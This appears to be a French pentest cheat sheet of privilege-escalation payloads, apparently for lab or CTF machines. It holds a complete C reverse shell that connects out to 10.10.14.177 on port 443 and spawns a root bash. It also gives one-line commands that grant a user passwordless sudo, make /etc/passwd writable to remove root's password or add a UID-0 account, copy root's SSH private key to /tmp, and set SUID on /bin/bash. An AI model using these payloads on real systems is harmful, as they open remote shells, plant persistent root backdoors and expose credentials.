
> [!TIP]
> Liste de payloads qui executés en root nous permettent de privesc

- [[#SUID / SGID]]
- [[#Reverse Shells]]
- [[#Ajout du user au groupe sudoers]]
- [[#Modifier droits sur /etc/passwd]]
- [[#Copier clé privée ssh root dans /tmp]]
- [[#Setuid sur /bin/bash]]


---
# SUID / SGID

> [!TIP]
> Si privesc à partir d'un SUID / SGID, penser a rajouter "setuid(geteuid());" dans le payload afin qu'il s'execute avec le SUID.

***Reverse-Shell.c**

```
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    setuid(geteuid());
    int port = 443;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.177");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execvp("/bin/bash", argv);

    return 0;       
}
```

```
gcc Reverse-Shell.c -o Reverse-Shell
```


---
# Reverse Shells


[[SHELLS#**REVERSE SHELLS**]]



---
# Ajout du user au groupe sudoers


```sh
echo "<user> ALL=NOPASSWD:ALL" >> /etc/sudoers
```


---
# Modifier droits sur /etc/passwd

> [!tip]
> Retirer le pass pour le compte root (x) ou rajouter un user avec l'uid 0 afin d'usurper root


```sh
chmod o+w /etc/passwd
```



---

# Copier clé privée ssh root dans /tmp


```sh
cp /root/.ssh/id_rsa /tmp
```


---

# Setuid sur /bin/bash

> [!TIP]
> executer ``/bin/bash -p`` une fois le payload exécuté


```sh
chmod u+s /bin/bash
```